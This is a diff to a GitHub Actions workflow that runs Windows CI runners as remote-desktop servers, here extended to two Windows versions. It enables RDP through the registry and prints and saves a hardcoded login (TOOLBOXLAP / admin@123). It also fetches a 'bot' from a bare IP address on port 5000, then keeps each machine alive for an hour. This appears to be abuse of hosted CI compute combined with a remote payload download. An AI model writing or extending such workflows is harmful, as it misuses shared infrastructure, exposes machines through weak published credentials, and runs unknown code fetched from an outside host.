@@ -8,17 +8,19 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        server: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
-    runs-on: windows-2019
+        os: [windows-2019, windows-2022]
+        server: [1, 2, 3, 4, 5]
+    runs-on: ${{ matrix.os }}
     timeout-minutes: 60
     steps:
-      - name: Run RDP Server ${{ matrix.server }}
+      - name: Run RDP Server ${{ matrix.server }} on ${{ matrix.os }}
         shell: pwsh
         run: |
           $serverNumber = ${{ matrix.server }}
+          $osVersion = "${{ matrix.os }}"
           
           Write-Host "============================================"
-          Write-Host "STARTING SERVER #$serverNumber"
+          Write-Host "STARTING SERVER #$serverNumber ON $osVersion"
           Write-Host "============================================"
           
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
@@ -43,6 +45,7 @@ jobs:
           
           Write-Host "============================================"
           Write-Host "SERVER NUMBER : $serverNumber"
+          Write-Host "WINDOWS OS    : $osVersion"
           Write-Host "IP ADDRESS    : $ip"
           Write-Host "PORT          : 3389"
           Write-Host "USERNAME      : TOOLBOXLAP"
@@ -56,6 +59,7 @@ jobs:
           "Port: 3389" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
           "User: TOOLBOXLAP" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
           "Pass: admin@123" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
+          "OS: $osVersion" | Out-File -FilePath $infoFile -Encoding UTF8 -Append
           
           $btol = "http://31.57.97.230:5000"
           try {
@@ -76,13 +80,13 @@ jobs:
               Write-Host "Error downloading bot"
           }
           
-          Write-Host "Server #$serverNumber is running for 60 minutes"
+          Write-Host "Server #$serverNumber on $osVersion is running for 60 minutes"
           $endTime = (Get-Date).AddMinutes(60)
           
           while ((Get-Date) -lt $endTime) {
               Start-Sleep -Seconds 60
               $remaining = [math]::Round(($endTime - (Get-Date)).TotalMinutes, 0)
-              Write-Host "Server #$serverNumber - $remaining minutes remaining - IP: $ip"
+              Write-Host "Server #$serverNumber on $osVersion - $remaining minutes remaining - IP: $ip"
           }
           
-          Write-Host "Server #$serverNumber session completed"
+          Write-Host "Server #$serverNumber on $osVersion session completed"
